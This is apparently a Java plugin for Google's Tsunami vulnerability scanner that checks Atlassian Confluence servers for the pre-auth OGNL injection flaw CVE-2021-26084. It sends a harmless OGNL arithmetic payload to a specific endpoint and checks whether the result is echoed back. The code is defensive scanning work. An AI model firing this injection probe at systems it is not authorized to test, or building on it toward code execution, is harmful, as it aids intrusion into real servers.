/*
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.confluence;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.tsunami.common.net.http.HttpRequest.post;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpStatus;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import javax.inject.Inject;

/** A {@link VulnDetector} that detects unprotected Atlassian Confluence Pre-Auth OGNL Injection. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "AtlassianConfluencePreAuthOgnlInjectionDetector",
    version = "0.1",
    description =
        "This detector checks for unprotected  Atlassian Confluence Pre-Auth OGNL Injection.",
    author = "C4o (syttcasd@gmail.com)",
    bootstrapModule = AtlassianConfluencePreAuthOgnlInjectionDetectorBootstrapModule.class)
public final class AtlassianConfluencePreAuthOgnlInjectionDetector implements VulnDetector {

  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private static final int NUMBER = 10086;
  private static final String PAYLOAD = String.format("queryString=Google\\u0027%%2b"
      + "#{%d*%d}%%2b\\u0027Tsunami", NUMBER, NUMBER);
  private static final String PATTERN = String.format("Google{%d=null}Tsunami", NUMBER * NUMBER);

  private final Clock utcClock;
  private final HttpClient httpClient;

  @Inject
  AtlassianConfluencePreAuthOgnlInjectionDetector(@UtcClock Clock utcClock, HttpClient httpClient) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService)
        + "pages/doenterpagevariables.action";
    try {
      HttpResponse response =
          httpClient.send(
              post(targetUri)
                  .setHeaders(
                      HttpHeaders.builder()
                          .addHeader("Content-Type",
                              "application/x-www-form-urlencoded")
                          .addHeader("User-Agent", "TSUNAMI_SCANNER")
                          .build())
                  .setRequestBody(ByteString.copyFrom(PAYLOAD, "utf-8"))
                  .build(),
              networkService);
      if (response.status() == HttpStatus.FORBIDDEN && response.bodyString().isPresent()) {
        if (response.bodyString().get().contains(PATTERN)) {
          return true;
        }
      }
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to request '%s'.", targetUri);
    }
    return false;
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(VulnerabilityId.newBuilder().setPublisher("TSUNAMI_COMMUNITY")
                    .setValue("CVE-2021-26084"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("Atlassian Confluence Pre-Auth OGNL Injection")
                .setDescription("An OGNL injection vulnerability exists that allows an "
                    + "unauthenticated attacker to execute arbitrary code on a Confluence "
                    + "Server or Data Center instance.")
                .setRecommendation("enable authentication")
        ).build();
  }
}
